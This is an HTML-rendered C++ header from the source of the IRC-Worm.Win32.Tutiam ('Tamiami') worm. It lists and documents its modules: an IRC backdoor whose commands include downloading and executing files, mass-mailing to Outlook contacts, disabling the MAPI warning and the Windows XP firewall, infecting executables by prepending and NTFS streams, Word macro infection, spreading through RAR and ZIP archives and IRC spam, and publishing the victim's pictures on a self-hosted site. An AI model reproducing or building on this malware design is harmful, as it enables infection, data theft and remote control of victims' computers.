<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>IRC-Worm.Win32.Tutiam.a - _Ver_Inc_Docu_.h.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">TamiamiSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">143360</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc2">///////////////////////////////
// The worm size in bytes.
///////////////////////////////
</span><span class="sc0">
</span><span class="sc2">//////////////////////////////////////////////////////////////
// Successful compiled with Microsoft© Visual C++© 6.0 SP5. //
//////////////////////////////////////////////////////////////
</span><span class="sc0">
</span><span class="sc2">///////////////////////////
// Used by API's and stuff.
///////////////////////////
</span><span class="sc9">#define WIN32_LEAN_AND_MEAN
</span><span class="sc2">//#include &lt;small.h&gt; - no need for tiny code :)
</span><span class="sc1">/*
#pragma comment(linker,"/ENTRY:main")
#pragma comment(linker,"/MERGE:.rdata=.data")
#pragma comment(linker,"/MERGE:.text=.data")
#pragma comment(lib,"msvcrt.lib")
#if (_MSC_VER &lt; 1300)
    #pragma comment(linker,"/IGNORE:4078")
    #pragma comment(linker,"/OPT:NOWIN98")
#endif

#define WIN32_LEAN_AND_MEAN
*/</span><span class="sc0">
</span><span class="sc9">#include &lt;windows.h&gt;
#include &lt;winsock2.h&gt;
#include &lt;mapi.h&gt;
#include &lt;random.h&gt;
</span><span class="sc1">/*
#include &lt;stdlib.h&gt; 
#include &lt;time.h&gt; 
#include &lt;windows.h&gt;

bool Sranded = false;

int RandomNumber(int MaxNumber)
{
    int RN;

    if(Sranded == false)
    {
        srand((unsigned)time(0) + GetTickCount());
        Sranded = true;
    }

    RN = (rand()%MaxNumber);

    return RN;
}
*/</span><span class="sc0">
</span><span class="sc9">#include &lt;wininet.h&gt;
#include &lt;winnls.h&gt;
#include &lt;tlhelp32.h&gt;
#include &lt;shellapi.h&gt;
</span><span class="sc2">//////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "AbuseUrl.h"
</span><span class="sc2">/////////////////////
// Usage:       AbuseUrl(IPAddress, OutputUrl);
// Description: This function generates a full social engeneering url with the 
//              http://username:pass@ip/ format with an give ip address. The ip address will
//              be formated with EscapeUrl to %hex format. If the infected machine is a german
//              one, a ".de" page will be created. Otherwise english pages, like ".com, .net, .org".
// Parameters:  IPAddress - The ip address as string, as example "84.192.65.14".
//              OutputUrl - A buffer with enough space, to hold the social engennered url. A
//              example url (without "):
//              "http://www.my-page.com:page_id@%38%34%2e%31%39%32%2e%36%35%2e%31%34/" .
// Return:      True if social engeneered url is successful generated, otherwise false.
// Example:     char IPAddress[] = "84.192.65.14";
//              char AbusedUrl[150];
//              AbuseUrl(IPAddress, AbusedUrl);
/////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "CreateWebseite.h"
</span><span class="sc2">///////////////////////////
// Usage:       CreateWebsite(OutputDirectory, NumberOfPictures);
// Description: This function will generate a website including some social engeneering text
//              and (NumberOfPictures) pictures, including links to subsites and a link to
//              the worm. If infected system is a german one, the text &amp; worm name will be
//              german, otherwise english.
// Parameters:  OutputDirectory - This is the full path (end with "\") where the internet files
//                                will be generated. Directory must exist.
//              NumberOfPictures - Number of Pictures to include at the website, pictures must
//                                 be already in the OutputDirectory, and named as "tamiami0",
//                                 "tamiami1", "tamiami2" and so on. All pictures without
//                                 suffixes. Browser will detect format.
// Return:      True if webite is successful generated, otherwise false.
// Example:     CreateWebsite("C:\\Windows\\TamiamiWeb\\", 3);
///////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "DisableMapiWarning.h"
</span><span class="sc2">///////////////////////////////
// Usage:       DisableMapiWarning();
// Description: This function disable the Outlook MAPI warning via manipulating the registry.
// Parameters:  None.
// Return:      True if successful disabled, otherwise false.
// Example:     DisableMapiWarning();
///////////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "DisableXPFirewall.h"
</span><span class="sc2">//////////////////////////////
// Usage:       DisableXPFirewall();
// Description: This function disables the firewall intigrated in XP SP2 via registry.
// Parameters:  None.
// Return:      True if successful disabled, otherwise false.
// Example:     DisableXPFirewall();
//////////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "DriveSpread.h"
</span><span class="sc2">////////////////////////
// Usage:       DriveSpread();
// Description: This function copy the worm file in different names to all fixed drives (A: - Z:).
// Parameters:  None.
// Return:      None.
// Example      DriveSpread();
////////////////////////
</span><span class="sc0">
</span><span class="sc2">//#include "EscapeUrl.h" - already included in AbuseUrl.h
//////////////////////
// Usage:       EscapeUrl(Url, OuputBuffer);
// Description: This function coverts a ip address in a %hex formated ip. As example the
//              ip 84.192.65.14 will convert to %38%34%2e%31%39%32%2e%36%35%2e%31%34 .
// Parameters:  Url - The Url as string that must be converted.
//              OutputBuffer - points to a buffer with enough space.
// Return:      Nothing.
// Example:     char IPAddress[] = "84.192.65.14";
//              char IPOutput[100];
//              EscapeUrl(IPAddress, IPOutput);
//////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "FakeExtraction.h"
</span><span class="sc2">///////////////////////////
// Usage:       FakeExtraction();
// Description: Show some message boxes and ask the user to extract 4 pictures to current
//              directory. If user click yes, 4 files with picture suffixes will be dropped
//              to current directory. These files have random size and random content, mean
//              you cant see anything. Message boxes will be displayed in german if system
//              is a german one, otherwise in english.
// Parameters:  None.
// Return:      Nothing.
// Example:     FakeExtraction();
///////////////////////////
</span><span class="sc0">
</span><span class="sc2">//#include "GermanLang.h" - already included in AbuseUrl.h
/////////////////////////
// Usage:       Germanlang();
// Description: This function checks if the infected system is a german one.
// Parameters:  None.
// Return:      True if system is a german one, otherwise false;
// Example:     GermanLang();
/////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "GetAutostartPath.h"
</span><span class="sc2">/////////////////////////////
// Usage:       GetAutostartPath(AutostartPath);
// Description: This function get's the first fitting application path from the "Run" key
//              in the registry. It checks on the doublepoint (:) if it is the full path,
//              if so it checks for the suffix is "exe" or "EXE". If this is true too, the
//              function returns true.
// Parameters:  AutostartPath - Points to a buffer with enough space for the full path of
//                              an autostarting application.
// Return:      True if a path is successful returned, otherwise false.
// Example:     char    AutostartApplication[MAX_PATH];
//              GetAutostartPath(AutostartApplication);
/////////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "GetIp.h"
</span><span class="sc2">//////////////////
// Usage:       GetIp(IPAddress);
// Description: This function get the ip address of the infected computer. First it tries to
//              get the ip with usage of winsock. If the ip is a network one (192.168.*.*)
//              the function connects to the internet and read the outside ip from
//              checkip.dyndns.org.
// Parameters:  IPAddress - Points to a buffer with enough space that will receive th ip address.
// Return:      True if ip successful received, otherwise false.
// Example:     char IPOutput[100];
//              GetIP(IPOutput);
//////////////////
</span><span class="sc0">
</span><span class="sc9">#include "GetOutlookContacts.h"
</span><span class="sc2">///////////////////////////////
// Usage:       GetOutlookContacts(ExtractionDirectory);
// Description: This function get all mail addresses from the outlook inbox and save each name
//              as file in an directory, that avoids double addresses.
// Parameters:  ExtractionDirectory - The directory where the file with the mail addresses will
//              be saved. Has to end with "\". Directory must exist.
// Return:      True if success, otherwise false.
// Example:     GetOutlookContacts("C:\\Windows\\TamiamiMails\\");
///////////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "GetPictures.h"
</span><span class="sc2">////////////////////////
// Usage:       GetPictures(CopyToDirectory, NumberOfPictures);
// Description: This function will copy (NumberOfPictures) from infected machine's "My Pictures"
//              folder to "CopyToDirectory". It have to end with "\", and must exist. The pictures
//              will be copyed to "tamiami0", "tamiami1" and so on.
// Parameters:  CopyToDirectory - Destination directory for the pictures
//              (*.jpg, *.gif, *.bmp, *png).
//              NumberOfPictures - number of pictures to copy from "My Pictures Folder".
// Return:      Number of pictures successful copyed.
// Example:     unsigned int PicturesCopyed;
//              PicturesCopyed = GetPictures("C:\\Windows\\TamiamiWeb\\", 3);
////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "GetVersion.h"
</span><span class="sc2">///////////////////////
// Usage:       GetVersion(Version, FullPath, AutostartMethod);
// Description: This function reads the worm version from the file stored in the
//              windows directory.
// Parameters:  Version - Points to a buffer for the worm version as string.
//              FullPath - Points to a buffer for the installation path of the worm,
//              AutostartMethod - Points to a buffer for the autostart method.
// Return:      True if success, otherwise false.
// Example:     char    Ver[MAX_PATH]       = "";
//              char    Path[MAX_PATH]      = "";
//              char    AutoStart[MAX_PATH] = "";
//              GetVersion(Ver, Path, AutoStart);
///////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "HTTPServer.h"
</span><span class="sc2">///////////////////////
// Usage:       HTTPServer(WebDirectory);
// Description: This function starts a http server on the infected machine, and can provide a
//              website with html files, pictures, flash, css, executables and so on. The
//              web directory must end with "\" and must exist. Note that the function will
//              create a endless loop, accepting all questions from outside.
// Parameters:  WebDirectory - The directory that provides all files for a website, index.htm
//              and so on. Note that the index file must end with ".htm" and not with ".html".
// Return:      False if http server cant get started, otherwise it return nothing, because of
//              the endless loop.
// Example:     HTTPServer("C:\\Windows\\TamiamiWeb\\");
///////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "IrcBackdoor.h"
</span><span class="sc2">////////////////////////
// Usage:       IrcBackdoor(IrcServer, Channel, Channelkey);
// Description: This function connects to a given IRC server and join the given Channel. If
//              the bot is OP it set's channel as secret and set the given key. Then the bot
//              listens for commands. Commands are:
//                  ^^quit              - quit bot from irc.
//                  ^^raw &lt;command&gt;     - send raw command to irc server.
//                  ^^dlexe &lt;url&gt;       - download file from HTTP and execute it.
// Parameters:  IrcServer - Connect to this IRC server.
//              Channel - Join this channel.
//              ChannelKey - With this channel password.
// Return:      False if bot can't connect.
//              True if bot quit connection with command.
//              Nothing as long as it listen to commands.
// Example:     IrcBackdoor("eu.undernet.org", "#testchannel", "testpass");
////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "IrcSpread.h"
</span><span class="sc2">//////////////////////
// Usage:       IrcSpread(IrcServer);
// Description: This function connects to the IRC server, and joins 6 random channels. It waits
//              for user JOIN, and spam a URL to an infected website to this user. If worm gets
//              kicked or banned from a channel, it joins a new one.
// Parameters:  IrcServer - To wich public IRC server should the worm connect
// Return:      False if something goes wrong, and nothing if success, because worm idle in channels.
// Example:     IrcSpread("eu.undernet.org");
//////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "IrcThreads.h"
</span><span class="sc2">///////////////////////
// Usage:       IrcThreads();
// Description: This function creates 7 threads, 6 for IRC spreading on public IRC servers, the
//              last thread starts the IRC backdoor.
// Return:      Nothing.
// Example:     IrcThreads();
///////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "MapiSendMail.h"
</span><span class="sc2">/////////////////////////
// Usage:       MapiSendMail(SessionHandle, MailToName, MailToAddress, Subject, Body, AttachedFileName, AttachedFilePath);
// Description: This function sends a mail via the simple mapi. You must be already logged on
//              into an mapi session.
// Parameters:  SessionHandle - A handle to an mapi session, returned by MapiLogon.
//              MailToName - Name of recipitant, not necessary, can be "".
//              MailToAddress - Mail of recipitant, needed to send the mail.
//              Subject - The Subject of the mail.
//              Body - The text of the mail.
//              AttachedFileName - File name of attached file, just need a filename not a path.
//                                 If not needed set just "".
//              AttachedFilePath - the full path to the file that must be attached. If not needed
//                                 set just "".
// Return:      True if mail successful send, otherwise false.
// Example:     MapiSendMail(MapiSessionHandle, "DiA", "DiA@rrlf.de", "Heya", "RRLF is great...", "RRLF6.zip", "C:\\RRLF\\Zine6.zip");
/////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "MassMailUrl.h"
</span><span class="sc2">////////////////////////
// Usage:       MassMailUrl(MailAddressDirectory);
// Description: This function mass mails the social engeneered url of the infected computer with
//              some text and a subject to all addresses in the outlook inbox. If the victim mail
//              address is a german one the text and subjects will be german, otherwise english.
// Parameters:  MailAddressDirectory - The path where the victim mail addresses are stored as
//                                     files. This path has to end with "\" and must exist.
// Return:      True if success, otherwise false.
// Example:     MassMailUrl("C:\\Windows\\TamiamiMails\\");
////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "MircSpread.h"
</span><span class="sc2">///////////////////////
// Usage:       MircSpread();
// Description: This function checks if mIRC is running, if so it create a script with several
//              messages, and append a URL to infected pc. Then Tamiami loads the script into
//              mIRC, when mIRC terminate, the script gets unloaded.
// Parameters:  None.
// Return:      True if successful generated and loaded, otherwise false.
// Example:     MircSpread();
///////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "NTFSCheck.h"
</span><span class="sc2">//////////////////////
// Usage:       NTFSCheck();
// Description: This function test if drive C:\ is NTFS formated drive.
// Parameters:  None.
// Return:      True, if hard drive is NTFS formated, otherwise false.
// Example:     NTFSCheck();
//////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "OnlyOneInstance.h"
</span><span class="sc2">////////////////////////////
// Usage:       OnlyOneInstance(MutexName);
// Description: This function checks if a instance of the worm already runs, if so it exits
//              the current process.
// Parameters:  MutexName - Name of worm instance.
// Return:      Nothing.
// Example:     OnlyOneInstance("Tamiami");
////////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "Payload.h"
</span><span class="sc2">////////////////////
// Usage:       Payload();
// Description: This fuction is the payload. It only activates on september 17. When activated
//              it bomb's the screen with 5 random text messages, in random places with random
//              colors. If it fails to create the DC it shows a simple message box.
// Parameters:  None.
// Return:      Nothing.
// Example:     Payload();
////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "Prepend.h"
</span><span class="sc2">////////////////////
// Usage:       Prepend(FileToInfect);
// Description: This function infects a file with the simple prepending methode. Infected
//              file will look like this: WormFile + HostFile + "Tamiami". "Tamiami" is the
//              infection marker as string.
// Parameters:  FileToInfect - Full path of executable file to infect.
// Return:      True if infection was successful, otherwise false.
// Example:     Prepend("C:\\Windows\\Calc.exe");
////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "RarPacker.h"
</span><span class="sc2">//////////////////////
// Usage:       AddToRar(RarFile, FileToAdd, PackedFileName, Attributes);
// Description: This function add's a file to a RAR archive. 
//              Written by DR-EF, http://home.arcor.de/dr-ef/.
// Parameters:  RarFile - The archive path, if file exist file will be added, if not
//                        RAR archive will be created.
//              FileToAdd - Path to the file to add to the RAR archive.
//              PackedFileName - The filename in the RAR archive.
//              Attributes - File attributes of the RAR archive.
// Return:      TRUE if success, otherwise FALSE:
// Example:     AddToRar("C:\\Archive.rar", "C:\\Worm.exe", "Install.exe", FILE_ATTRIBUTE_NORMAL);
//////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "RarWorm.h"
</span><span class="sc2">////////////////////
// Usage:       RarWorm();
// Description: This function adds the worm file with random name or name of archive to
//              any RAR archives on any fixed/remote drive.
// Parameters:  None.
// Return:      Nothing.
// Example:     RarWorm();
////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "RegisterServiceProcess.h"
</span><span class="sc2">///////////////////////////////////
// Usage:       RegisterServiceProcess();
// Description: This function hides the worm from the task manager under win9x systems.
// Parameters:  None.
// Return:      Nothing.
// Example:     RegisterServiceProcess();
///////////////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "RegisterVersion.h"
</span><span class="sc2">////////////////////////////
// Usage:       RegisterVersion(Version, FullPath, AutostartMethod);
// Description: This function writes information about the current worm version to a file
//              in the windows directory.
// Parameters:  Version - The worm version as string.
//              FullPath - The path of the installed worm.
//              AutostartMethod - The method how the worm autostarts.
//                                "NTFS" &gt;&gt; Starts via stream companioning.
//                                "Prepend" &gt;&gt; Starts via prepending.
//                                "Regular" &gt;&gt; Starts via the regular autostart method.
// Return:      True if the file was successful written, otherwise false.
// Example:     RegisterVersion("Version 1", "C:\\Windows\\calc.exe:Tamiami", "NTFS");
//              //^register version 1 with stream companioning autostart
//              RegisterVersion("Version 1", "C:\\Windows\\calc.exe", "Prepend");
//              //^register version 1 with prepending autostart
//              RegisterVersion("Version 1", "C:\\Windows\\strangler.exe", "Regular");
//              //^register version 1 with regular autostart method
////////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "SimpleAutostart.h"
</span><span class="sc2">////////////////////////////
// Usage:       SimpleAutostart();
// Description: This function copy the worm to the windows directory, and set a autorun
//              key to the registry. This is the most common way to autostart a program.
// Parameters:  None.
// Return:      Nothing.
// Example:     SimpleAutostart();
////////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "SimpleMassMail.h"
</span><span class="sc2">///////////////////////////
// Usage:       SimpleMassMail();
// Description: This function mass mails the worm body as attachment to all contacts in
//              the inbox from outlook. It has multiple bodys and attachment names.
//              If the system is a german one, it sends mail bodys and attachments with
//              german language, otherwise english.
// Parameters:  None.
// Return:      Nothing.
// Example:     SimpleMassMail();
///////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "StartHost.h"
</span><span class="sc2">/////////////////////
// Usage:       StartHost();
// Description: This function extracts and starts the host program if the prepending methode
//              was used.
// Parameters:  None.
// Return:      True if host successful executed, otherwise false.
// Example:     StartHost();
/////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "StartStream.h"
</span><span class="sc2">////////////////////////
// Usage:       StartStream();
// Description: This function starts the stream "Tamiami" (host program) if it exist.
// Parameters:  None.
// Return:      True if stream successful started, otherwise false.
// Example:     StartStream();
////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "StreamCompanion.h"
</span><span class="sc2">////////////////////////////
// Usage:       StreamCompanion(FileToInfect);
// Description: This function infects a executable via the stream companion method.
//              Note that a NTFS formated drive is needed that this infection method works.
// Parameters:  FileToInfect - Full path of executable to infect.
// Return:      True if infection was successful, otherwise false.
// Example:     StreamCompanion("C:\\Windows\\Calc.exe");
////////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "TakeCareOnMe.h"
</span><span class="sc2">/////////////////////////
// Usage:       TakeCareOnMe(TakeCareFullPath);
// Description: This function drop's the tool "TakeCareOnMe 1.0" to the windows directory
//              and executes it with the install path of the worm. This will cause that the
//              worm restarts if it got terminated.
// Parameters:  TakeCareFullPath - full path of application to take care for
// Return:      True if successful, otherwise false.
// Example:     TakeCareOnMe("C:\\WINDOWS\\strangler.exe");
/////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "TerminateWormProcess.h"
</span><span class="sc2">/////////////////////////////////
// Usage:       TerminateWormProcess();
// Description: This function terminate the installed running process of the worm.
// Parameters:  None.
// Return:      True if successful terminated, otherwise false.
// Example:     TerminateWormProcess();
/////////////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "UpdateWorm.h"
</span><span class="sc2">///////////////////////
// Usage:       UpdateWorm(CurrentVersion);
// Description: This function updates the worm if the current running version is higher
//              then the installed. Therefor it stops the installed running process
//              and checks how the worm autostarts. If it starts via NTFS method, it
//              restore the original host, and infect it again with new version.
//              Same with Prepend method. If it starts regular it just overwrites the
//              old version with the new one.
// Parameters:  CurrentVersion - String with the current version of the worm.
// Return:      True if successful updated, otherwise false (same or newer version).
// Example:     UpdateWorm("Tamaimi V1.3");             
///////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "WaitForConnection.h"
</span><span class="sc2">//////////////////////////////
// Usage:       WaitForConnection();
// Description: This function query google.com and check if there is a internet connection.
//              If not it sleeps 1 minute, and check again, and again...
// Parameters:  None.
// Return:      Nothing. Returns when ineternet connection is available.
// Example:     WaitForConnection();
//////////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "WordInfection.h"
</span><span class="sc2">//////////////////////////
// Usage:       WordInfection();
// Description: This function drops a .vbs file and excutes it. This vbs file insert lines
//              in the Normal.dot file from word. The function now infects every .doc that
//              gets opened with the worm executable and a little dropper macro.
// Parameters:  None.
// Return:      True if successful dropped and executed, otherwise false.
// Example:     WordInfection();
//////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "WormInstalled.h"
</span><span class="sc2">//////////////////////////
// Usage:       WormInstalled();
// Description: This function checks if the worm's properties file in the windows
//              directory exists. If so the worm is already installed in the system.
// Parameters:  None.
// Return:      True if worm is already installed, otherwise false.
// Example:     WormInstalled();
//////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "ZipPackerIn.h"
#include "ZipPackerOut.h"
</span><span class="sc2">/////////////////////////
// Usage:       CreateZip(ZipFile, MemLength, Type);
//              ZipAdd(ZipHandle, InsideName, FileToAdd, MemLength, Type);
//              CloseZip(ZipHandle);
// Description: This functions can handle ZIP archives, I used it only to create ZIP
//              archives, add files and close it. Coded/Modded by Lucian Wischik, original
//              code by Mark Adler et al. I wonder if they want it for that usage ;).
// Parameters:  ZipFile - the ZIP archive to create
//              MemLength - must be 0 when using only with files.
//              Type - what type is it, only ZIP_FILENAME is used.
//              ZipHandle - handle to open ZIP archive.
//              InsideName - under wich name store file in ZIP.
//              FileToAdd - the file to add to the ZIP archive.
// Return:      CreateZip - HZIP (handle) to ZIP file, otherwise 0.
//              ZipAdd - ZRESULT is ZR_OK, otherwise other value.
//              CloseZip - nothing.
// Example:     HZIP ZipHandle;
//              ZipHandle = CreateZip("test.zip", 0, ZIP_FILENAME);
//              ZipAdd(ZipHandle, "Install.exe", "Worm.exe", 0, ZIP_FILENAME);
//              CloseZip(ZipHandle);
/////////////////////////
</span><span class="sc0">
</span><span class="sc9">#include "ZipWorm.h"
</span><span class="sc2">////////////////////
// Usage:       ZipWorm();
// Description: This function adds the worm file under random names to all ZIP archives
//              on all drives. OpenZip doesnt work for me, so its little other techique then
//              RarWorm(). It adds the zip to the zip itself, and biside the worm executable.
// Parameters:  None.
// Return:      Nothing.
// Example:     ZipWorm();
////////////////////</span></div></body>
</html>
